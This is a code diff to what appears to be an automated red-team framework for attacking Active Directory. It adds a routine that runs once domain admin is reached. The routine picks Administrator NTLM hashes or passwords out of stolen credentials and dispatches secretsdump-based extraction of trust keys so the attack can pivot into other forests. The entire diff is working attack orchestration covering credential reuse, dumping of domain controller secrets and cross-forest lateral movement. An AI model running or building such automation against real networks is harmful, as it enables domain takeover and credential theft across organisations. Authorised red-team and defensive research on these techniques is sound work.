@@ -77,6 +77,13 @@ class AnnouncementMixin:
                     f"ARES_MULTI_FOREST_MODE enabled - {len(undominated)} trusted "
                     f"forest(s) remaining: {undominated}"
                 )
+                # Auto-dispatch trust key extraction for cross-forest pivoting
+                await self._auto_dispatch_trust_key_extraction(
+                    da_domain=domain,
+                    da_username=username,
+                    undominated_forests=undominated,
+                    source_agent=source_agent,
+                )
 
         if should_complete:
             self.shared_state.completed = True
@@ -99,6 +106,117 @@ class AnnouncementMixin:
                 "mitre.technique.id": "T1003.006",  # DCSync/credential dumping
             },
         )
+
+    async def _auto_dispatch_trust_key_extraction(
+        self: RedTeamDispatcher,
+        da_domain: str,
+        da_username: str,
+        undominated_forests: list[str],
+        source_agent: str,
+    ) -> None:
+        """Auto-dispatch trust key extraction for cross-forest pivoting.
+
+        When DA is achieved on a domain and other forests remain undominated,
+        automatically extract trust keys to enable cross-forest attacks.
+
+        Args:
+            da_domain: Domain where we just achieved DA.
+            da_username: Username of the DA account.
+            undominated_forests: List of foreign forests not yet dominated.
+            source_agent: Agent that achieved DA.
+        """
+        # Get DC IP for the domain where we have DA
+        da_domain_lower = da_domain.lower()
+        dc_ip = self.shared_state.domain_controllers.get(da_domain_lower)
+        if not dc_ip:
+            logger.warning(f"Cannot dispatch trust key extraction: no DC IP for {da_domain}")
+            return
+
+        # Find DA credential (password or hash) for the domain
+        # Look for krbtgt hash first (proves we have full DA access)
+        da_hash = None
+        da_password = None
+
+        # Check for krbtgt hash (most reliable DA indicator)
+        for h in self.shared_state.all_hashes:
+            if (
+                h.username.lower() == "krbtgt"
+                and h.domain
+                and h.domain.lower() == da_domain_lower
+                and h.hash_type.upper() == "NTLM"
+            ):
+                # We have krbtgt, look for Administrator hash to use for secretsdump
+                break
+
+        # Look for Administrator hash or password
+        for h in self.shared_state.all_hashes:
+            if (
+                h.username.lower() == "administrator"
+                and h.domain
+                and h.domain.lower() == da_domain_lower
+                and h.hash_type.upper() == "NTLM"
+            ):
+                da_hash = h.hash_value
+                break
+
+        # Fallback to password credential
+        if not da_hash:
+            for cred in self.shared_state.all_credentials:
+                if (
+                    cred.domain
+                    and cred.domain.lower() == da_domain_lower
+                    and cred.password
+                    and cred.username.lower() in ("administrator", da_username.lower())
+                ):
+                    da_password = cred.password
+                    da_username = cred.username
+                    break
+
+        if not da_hash and not da_password:
+            logger.warning(
+                f"Cannot dispatch trust key extraction: no DA credentials for {da_domain}"
+            )
+            return
+
+        # Dispatch trust key extraction for each undominated forest
+        for target_forest in undominated_forests:
+            # Dedup key: source_domain:target_forest (persists across restarts via shared_state)
+            dedup_key = f"{da_domain_lower}:{target_forest.lower()}"
+            if dedup_key in self.shared_state.processed_trust_extractions:
+                logger.debug(f"Trust key extraction already dispatched: {dedup_key}")
+                continue
+
+            self.shared_state.processed_trust_extractions.add(dedup_key)
+
+            # Build task payload
+            # extract_trust_key uses secretsdump -just-dc-user FORESTNETBIOS$
+            task_payload = {
+                "tool": "extract_trust_key",
+                "domain": da_domain,
+                "username": "Administrator" if da_hash else da_username,
+                "password": da_hash or da_password,
+                "dc_ip": dc_ip,
+                "trusted_domain": target_forest,
+                "use_hash": bool(da_hash),
+            }
+
+            logger.warning(
+                f"🌲 Auto-dispatching trust key extraction: {da_domain} → {target_forest} "
+                f"(DC: {dc_ip}, using {'hash' if da_hash else 'password'})"
+            )
+
+            # Dispatch to privesc worker (has KerberosTools with extract_trust_key)
+            if self._task_queue:
+                try:
+                    await self._throttled_submit_task(
+                        task_type="exploit",
+                        target_role="privesc",
+                        payload=task_payload,
+                        source_agent="auto_trust_extraction",
+                        priority=1,  # High priority - critical for multi-forest
+                    )
+                except Exception as e:
+                    logger.error(f"Failed to dispatch trust key extraction: {e}")
 
     async def announce_golden_ticket(
         self: RedTeamDispatcher,
